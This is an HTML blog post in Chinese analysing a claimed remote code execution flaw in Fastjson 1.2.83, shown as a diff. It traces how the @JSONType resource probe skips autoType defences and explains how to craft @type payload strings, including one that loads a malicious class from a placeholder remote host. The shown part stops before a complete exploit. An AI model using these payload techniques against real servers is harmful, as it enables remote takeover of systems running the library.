@@ -1,0 +1,845 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Fastjson 1.2.83 RCE 分析及复现 | Y5neKO's Blog</title><meta name="author" content="Y5neKO"><meta name="copyright" content="Y5neKO"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Fastjson 1.2.83 RCE 分析及复现一、漏洞概述2026 年 7 月 19 日，FearsOff CTO Kirill Firsov（@k_firsov）公开声称在 Fastjson 1.2.83 中发现了一个无需任何 gadget 依赖的远程代码执行漏洞。作者在推文中描述：”不依赖目标 classpath 上的任何库，’移除危险类’缓解无效，一个 payload 即可实现 RCE。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson 1.2.83 RCE 分析及复现">
+<meta property="og:url" content="https://y5neko.github.io/blog/2026/07/22/ARTICLE/index.html">
+<meta property="og:site_name" content="Y5neKO&#39;s Blog">
+<meta property="og:description" content="Fastjson 1.2.83 RCE 分析及复现一、漏洞概述2026 年 7 月 19 日，FearsOff CTO Kirill Firsov（@k_firsov）公开声称在 Fastjson 1.2.83 中发现了一个无需任何 gadget 依赖的远程代码执行漏洞。作者在推文中描述：”不依赖目标 classpath 上的任何库，’移除危险类’缓解无效，一个 payload 即可实现 RCE。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://y5neko.github.io/blog/image/HAMT_1784723505543_image-20260722121049808.png">
+<meta property="article:published_time" content="2026-07-22T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-22T12:31:45.636Z">
+<meta property="article:author" content="Y5neKO">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://y5neko.github.io/blog/image/HAMT_1784723505543_image-20260722121049808.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Fastjson 1.2.83 RCE 分析及复现",
+  "url": "https://y5neko.github.io/blog/2026/07/22/ARTICLE/",
+  "image": "https://y5neko.github.io/blog/image/HAMT_1784723505543_image-20260722121049808.png",
+  "datePublished": "2026-07-22T04:00:00.000Z",
+  "dateModified": "2026-07-22T12:31:45.636Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Y5neKO",
+      "url": "https://y5neko.github.io/blog"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/blog/image/icon.png"><link rel="canonical" href="https://y5neko.github.io/blog/2026/07/22/ARTICLE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/blog/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const hour = new Date().getHours()
+          const isNight = hour <= 8 || hour >= 20
+          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else theme === 'light' ? activateLightMode() : activateDarkMode()
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/blog/',
+  algolia: undefined,
+  localSearch: {"path":"/blog/search.json","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Fastjson 1.2.83 RCE 分析及复现',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/blog/rss2.xml" title="Y5neKO's Blog" type="application/rss+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/123.jpeg" onerror="this.onerror=null;this.src='/blog/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/blog/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/blog/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/blog/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/blog/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/blog/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/blog/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 项目</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/qq-xml-ip"><i class="fa-fw fab fa-github"></i><span> qq-xml-ip</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/CryptoTool"><i class="fa-fw fab fa-github"></i><span> CryptoTool</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/Y5_VulnHub"><i class="fa-fw fab fa-github"></i><span> Y5_VulnHub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/ShiroEXP"><i class="fa-fw fab fa-github"></i><span> ShiroEXP</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/ClosureVulnScanner"><i class="fa-fw fab fa-github"></i><span> ClosureVulnScanner</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/Mon3trProject"><i class="fa-fw fab fa-github"></i><span> Mon3trProject</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/Webshell-Collection"><i class="fa-fw fab fa-github"></i><span> Webshell-Collection</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/ExpAndPoc_Colection"><i class="fa-fw fab fa-github"></i><span> EXP&amp;POC_Collection</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/Y5-tools"><i class="fa-fw fab fa-github"></i><span> Y5-tools</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/ArknightsPriestess"><i class="fa-fw fab fa-github"></i><span> ArknightsPriestess</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/YCryptoTools"><i class="fa-fw fab fa-github"></i><span> YCryptoTools</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/SSRFxxk"><i class="fa-fw fab fa-github"></i><span> SSRFxxk</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/QuickRedTools"><i class="fa-fw fab fa-github"></i><span> QuickRedTools</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/SSReportTools"><i class="fa-fw fab fa-github"></i><span> SSReportTools</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/blog/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/blog/image/HAMT_1784723505543_image-20260722121049808.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/blog/"><span class="site-name">Y5neKO's Blog</span></a><a class="nav-page-title" href="/blog/"><span class="site-name">Fastjson 1.2.83 RCE 分析及复现</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/blog/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/blog/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/blog/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 项目</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/qq-xml-ip"><i class="fa-fw fab fa-github"></i><span> qq-xml-ip</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/CryptoTool"><i class="fa-fw fab fa-github"></i><span> CryptoTool</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/Y5_VulnHub"><i class="fa-fw fab fa-github"></i><span> Y5_VulnHub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/ShiroEXP"><i class="fa-fw fab fa-github"></i><span> ShiroEXP</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/ClosureVulnScanner"><i class="fa-fw fab fa-github"></i><span> ClosureVulnScanner</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/Mon3trProject"><i class="fa-fw fab fa-github"></i><span> Mon3trProject</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/Webshell-Collection"><i class="fa-fw fab fa-github"></i><span> Webshell-Collection</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/ExpAndPoc_Colection"><i class="fa-fw fab fa-github"></i><span> EXP&amp;POC_Collection</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/Y5-tools"><i class="fa-fw fab fa-github"></i><span> Y5-tools</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/ArknightsPriestess"><i class="fa-fw fab fa-github"></i><span> ArknightsPriestess</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/YCryptoTools"><i class="fa-fw fab fa-github"></i><span> YCryptoTools</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/SSRFxxk"><i class="fa-fw fab fa-github"></i><span> SSRFxxk</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/QuickRedTools"><i class="fa-fw fab fa-github"></i><span> QuickRedTools</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://github.com/Y5neKO/SSReportTools"><i class="fa-fw fab fa-github"></i><span> SSReportTools</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/blog/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Fastjson 1.2.83 RCE 分析及复现<a class="post-edit-link" href="https://github.com/Y5neKO/Y5neKO.github.com_config/edit/main/source/_posts/ARTICLE.md" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-07-22T04:00:00.000Z" title="发表于 2026-07-22 12:00:00">2026-07-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-22T12:31:45.636Z" title="更新于 2026-07-22 20:31:45">2026-07-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/blog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/blog/2026/07/22/ARTICLE/#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;这篇文章最后更新时间是&quot;,&quot;messageNext&quot;:&quot;天之前，描述可能已经失效，请谨慎辨别.&quot;,&quot;postUpdate&quot;:&quot;2026-07-22 20:31:45&quot;}" hidden></div><h1 id="Fastjson-1-2-83-RCE-分析及复现"><a href="#Fastjson-1-2-83-RCE-分析及复现" class="headerlink" title="Fastjson 1.2.83 RCE 分析及复现"></a>Fastjson 1.2.83 RCE 分析及复现</h1><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><p>2026 年 7 月 19 日，FearsOff CTO Kirill Firsov（@k_firsov）公开声称在 Fastjson 1.2.83 中发现了一个无需任何 gadget 依赖的远程代码执行漏洞。作者在推文中描述：”不依赖目标 classpath 上的任何库，’移除危险类’缓解无效，一个 payload 即可实现 RCE。”</p>
+<p>作者在推文问答中进一步确认了以下约束：</p>
+<ul>
+<li>影响 1.2.68 至 1.2.83 全版本</li>
+<li><code>autoType</code> 默认关闭即可触发（非”绕过 autoType”）</li>
+<li><code>JSON.parse(String)</code> 与 <code>JSON.parseObject(String)</code> 均可达</li>
+<li>不是 expectClass + Throwable 链</li>
+<li>不是 XMLDecoder</li>
+<li>唯一缓解：<code>safeMode=true</code> 或升级 fastjson 2.x</li>
+</ul>
+<hr>
+<h2 id="二、漏洞根因：checkAutoType-的-JSONType-资源探测"><a href="#二、漏洞根因：checkAutoType-的-JSONType-资源探测" class="headerlink" title="二、漏洞根因：checkAutoType 的 @JSONType 资源探测"></a>二、漏洞根因：checkAutoType 的 @JSONType 资源探测</h2><h3 id="2-1-漏洞入口"><a href="#2-1-漏洞入口" class="headerlink" title="2.1 漏洞入口"></a>2.1 漏洞入口</h3><p>源码位置：<code>com.alibaba.fastjson.parser.ParserConfig</code>，Maven 坐标 <code>com.alibaba:fastjson:1.2.83</code>。</p>
+<p><code>checkAutoType</code> 方法（约 <code>com.alibaba.fastjson.parser.ParserConfig:1311</code> 行起）在处理每个 <code>@type</code> 值时，会执行一段 <code>@JSONType</code> 注解探测逻辑。关键代码位于约 <code>com.alibaba.fastjson.parser.ParserConfig:1483-1510</code> 行。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505504_image-20260722014534169.png" alt="image-20260722014534169"></p>
+<p>核心逻辑如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 步骤1：将 @type 值的 . 替换为 /，拼成 resource 路径</span></span><br><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 步骤2：用 ClassLoader 加载这个 resource</span></span><br><span class="line"><span class="keyword">if</span> (defaultClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">    is = defaultClassLoader.getResourceAsStream(resource);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 步骤3：如果找到了，用 ASM 读取类字节码，检查是否有 @JSONType 注解</span></span><br><span class="line"><span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">    classReader.accept(visitor);</span><br><span class="line">    jsonType = visitor.hasJsonType();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 步骤4：如果 jsonType=true，直接 loadClass（跳过黑名单！）</span></span><br><span class="line"><span class="keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 步骤5：如果 jsonType=true，直接返回（跳过所有后续安全检查）</span></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span> &amp;&amp; jsonType) &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz;  <span class="comment">// 跳过 deny-list、ClassLoader/DataSource/RowSet 检查</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-JSONType-旁路机制"><a href="#2-2-JSONType-旁路机制" class="headerlink" title="2.2 @JSONType 旁路机制"></a>2.2 @JSONType 旁路机制</h3><p>正常情况下，fastjson 的 autoType 防御包含多层：</p>
+<ol>
+<li>safeMode 总开关（<code>com.alibaba.fastjson.parser.ParserConfig:1326-1331</code>）</li>
+<li>deny-list 黑名单（<code>com.alibaba.fastjson.parser.ParserConfig:1386-1416</code>，169 个哈希）</li>
+<li>ClassLoader&#x2F;DataSource&#x2F;RowSet 硬拦截（<code>com.alibaba.fastjson.parser.ParserConfig:1513-1518</code>）</li>
+<li>expectClass 类型匹配（<code>com.alibaba.fastjson.parser.ParserConfig:1520-1528</code>）</li>
+</ol>
+<p>但 <code>jsonType=true</code> 时，代码在 <code>com.alibaba.fastjson.parser.ParserConfig:1510</code> 行直接 <code>return clazz</code>，短路跳过上述所有检查。这意味着：只要攻击者能让 <code>getResourceAsStream</code> 返回一个带 <code>@JSONType</code> 注解的恶意类，就能绕过全部防御。</p>
+<h3 id="2-3-类名转换规则（关键约束）"><a href="#2-3-类名转换规则（关键约束）" class="headerlink" title="2.3 类名转换规则（关键约束）"></a>2.3 类名转换规则（关键约束）</h3><p>fastjson 会将同一个 <code>@type</code> 字符串分别传入 ClassLoader 的两个入口，两侧实参不同。源码 <code>com.alibaba.fastjson.parser.ParserConfig:1482-1502</code>：</p>
+<ul>
+<li><code>com.alibaba.fastjson.parser.ParserConfig:1482</code>：构造 <code>resource = typeName.replace(&#39;.&#39;, &#39;/&#39;) + &quot;.class&quot;</code></li>
+<li><code>com.alibaba.fastjson.parser.ParserConfig:1484</code>：资源探测 <code>getResourceAsStream(resource)</code> —— 传入 replace 后的值</li>
+<li><code>com.alibaba.fastjson.parser.ParserConfig:1502</code>：类加载 <code>TypeUtils.loadClass(typeName, ...)</code> —— 传入原始 <code>typeName</code>（不经 replace，最终进入 <code>com.alibaba.fastjson.util.TypeUtils:1762</code> 的 <code>loadClass</code>）</li>
+</ul>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505529_image-20260722024738556.png" alt="image-20260722024738556"></p>
+<table>
+<thead>
+<tr>
+<th>入口</th>
+<th>实参</th>
+<th>语义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>getResourceAsStream</code>（资源探测）</td>
+<td>replace 后</td>
+<td>资源路径，规范上使用 <code>/</code></td>
+</tr>
+<tr>
+<td><code>loadClass</code>（类加载）</td>
+<td>原始 <code>typeName</code></td>
+<td>binary name，由 <code>ClassLoader</code> 校验</td>
+</tr>
+</tbody></table>
+<p>也就是说：<code>replace</code> 只作用于资源探测，类加载始终使用原始 <code>@type</code>；同一字符串必须同时满足两侧。</p>
+<p>加载侧会进入 <code>ClassLoader.loadClass</code>，并先经私有方法 <code>checkName</code> 校验 binary name（JDK 8 <code>rt.jar</code> &#x2F; <code>java.lang.ClassLoader</code>）。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505534_image-20260722025021051.png" alt="image-20260722025021051"></p>
+<p><code>checkName</code> 在 binary name 含 <code>/</code> 时直接返回 false，类加载失败：</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505537_image-20260722021248437.png" alt="image-20260722021248437"></p>
+<p>因此路径分隔符必须使用 <code>.</code> 而非 <code>/</code>：原文可通过 <code>checkName</code>，fastjson 再将 <code>.</code> 替换为 <code>/</code> 以符合资源路径。两侧对 <code>/</code> 的要求相反，而 <code>.</code> 恰好能同时满足两处约束。</p>
+<table>
+<thead>
+<tr>
+<th>@type 值</th>
+<th>loadClass（原文）</th>
+<th>getResourceAsStream（replace 后）</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>jar:file:.tmp.probe!.POC</code></td>
+<td>无 <code>/</code>，<code>checkName</code> 通过</td>
+<td><code>jar:file:/tmp/probe!/POC.class</code></td>
+<td>两侧均通过</td>
+</tr>
+<tr>
+<td><code>jar:file:/tmp/probe!.POC</code></td>
+<td>含 <code>/</code>，<code>checkName</code> 拒绝</td>
+<td><code>jar:file:/tmp/probe!/POC.class</code></td>
+<td>类加载失败</td>
+</tr>
+</tbody></table>
+<p>除 <code>.</code> &#x2F; <code>/</code> 外，相关字符还需经过两层校验：<code>checkName</code> 主要检查名称结构（禁止 <code>/</code>），不检查是否为合法 Java 标识符；进入 <code>defineClass</code> 时另有 JVM native 校验。</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th><code>checkName</code></th>
+<th>JVM native（<code>defineClass</code>）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.</code></td>
+<td>允许（binary name 标准分隔符）</td>
+<td>允许</td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td><strong>拒绝</strong></td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>:</code> <code>!</code></td>
+<td>不校验</td>
+<td>JDK8 <code>verify_unqualified_name</code> 宽松放行（基于 JSR202）</td>
+</tr>
+</tbody></table>
+<p>因此 <code>@type</code> 中可以使用 <code>jar:</code>、<code>!</code> 等字符（如 <code>jar:http:..IP.PORT.probe!.POC</code>）。native 层细节后面展开。</p>
+<p>还有一层约束容易忽略：<code>defineClass(name, bytes)</code> 会校验 class 字节码里的 internal name（<code>this_class</code>）必须与传入的 binary name 的 internal 形式（即 <code>@type</code> 把 <code>.</code> 全部替换成 <code>/</code> 的结果）完全一致，不一致就抛 <code>ClassFormatError</code> &#x2F; <code>NoClassDefFoundError</code>。所以生成恶意 class 时，它的 internal name 不能随便取，必须按 resource path 的形式构造。以 <code>@type=jar:file:.tmp.probe!.POC</code> 为例：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>@type</code>（binary name，交 <code>loadClass</code>）</td>
+<td><code>jar:file:.tmp.probe!.POC</code></td>
+</tr>
+<tr>
+<td>replace 后（internal 形式，&#x3D; resource path）</td>
+<td><code>jar:file:/tmp/probe!/POC</code></td>
+</tr>
+<tr>
+<td>class 字节码 internal name（<code>this_class</code>，必须等于上一行）</td>
+<td><code>jar:file:/tmp/probe!/POC</code></td>
+</tr>
+</tbody></table>
+<p>三者对上，<code>defineClass</code> 才放行。这也是后面生成 evil jar 时 internal name 要写成 <code>jar:file:/tmp/probe!/POC</code>、而不是 <code>POC</code> 或 <code>probe.POC</code> 的原因。</p>
+<hr>
